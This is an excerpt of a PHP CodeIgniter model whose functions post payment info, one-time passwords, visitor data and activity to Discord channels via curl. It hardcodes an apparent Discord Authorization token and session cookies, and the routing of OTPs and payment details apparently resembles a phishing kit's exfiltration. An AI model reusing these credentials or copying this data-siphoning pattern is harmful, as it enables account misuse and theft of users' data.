...
class M_base extends CI_Model{
	...
	function post_discord($json){
		...
		curl_setopt_array($curl, array(
		  ...
		  CURLOPT_URL => 'https://discord.com/api/v9/channels/947181563202899998/messages',
		  ...
		  CURLOPT_HTTPHEADER => array(
		    ...
		    'Authorization: NzU4MzE1MzE5MTMwODQ5MzIy.YgNr0Q.6bhU-PiaGHXNrO7pTYWBYifDPGg',

		    'Content-Type: application/json',

		    'Cookie: __dcfduid=417ab7c194b911eca6b342010a0a07fd; __sdcfduid=417ab7c194b911eca6b342010a0a07fd7b55622596be785cee66d56977963f7144e746f79e6964d0f1b0cdb8c838ea4a'
	...
	function post_discord_image($imageurl,$payment_method,$title){



		$content = array(

			'content' => $imageurl.' Trx Id = ['.$title.'] Payment Info = ['.$payment_method.']'
	...
	function post_discord_otp($json){
		...
		curl_setopt_array($curl, array(
		  ...
		  CURLOPT_URL => 'https://discord.com/api/v9/channels/947636544515219476/messages',
	...
	function post_discord_visitor($json){
		...
		curl_setopt_array($curl, array(
		  ...
		  CURLOPT_URL => 'https://discord.com/api/v9/channels/947649942556651531/messages',
	...
	function post_discord_activity($json){
		...
		curl_setopt_array($curl, array(
		  ...
		  CURLOPT_URL => 'https://discord.com/api/v9/channels/947641298620387328/messages',
